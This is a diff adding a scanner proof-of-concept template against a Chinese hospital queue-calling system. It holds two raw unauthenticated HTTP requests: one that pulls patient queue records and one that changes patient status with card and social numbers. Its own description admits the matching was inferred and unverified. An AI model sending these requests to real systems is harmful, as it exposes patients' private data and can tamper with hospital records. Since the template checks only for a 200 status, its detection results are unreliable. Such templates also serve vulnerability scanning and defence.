@@ -1,0 +1,63 @@
+id: poc-e38b9d466e1f8a2b1163
+info:
+  name: 心医国际排队叫号系统敏感信息泄露
+  author: hacktwo
+  severity: medium
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/e38b9d466e1f8a2b11636b168fe2c8ec
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: info-leak,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: e38b9d466e1f8a2b11636b168fe2c8ec
+http:
+- raw:
+  - 'POST /showqueue/showqueue/patient/queryQueueInfo HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Accept: application/json, text/javascript, */*; q=0.01
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36
+
+    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+
+    Accept-Encoding: gzip, deflate
+
+    Accept-Language: zh-CN,zh;q=0.9
+
+    Connection: close
+
+    Content-Length: 104
+
+
+    patientstatus=&queueID=&department=&waitarea=&name=&startTime=&endTime=&curPage=0&queueNumber=&operator='
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
+- raw:
+  - 'POST /showqueue/showqueue/patient/statusUpdate HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Content-Length: 32
+
+    Accept: application/json, text/javascript, */*; q=0.01
+
+    X-Requested-With: XMLHttpRequest
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36
+
+    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+
+    Connection: close
+
+
+    cardNo=1&cardType=out&socialNo=1'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
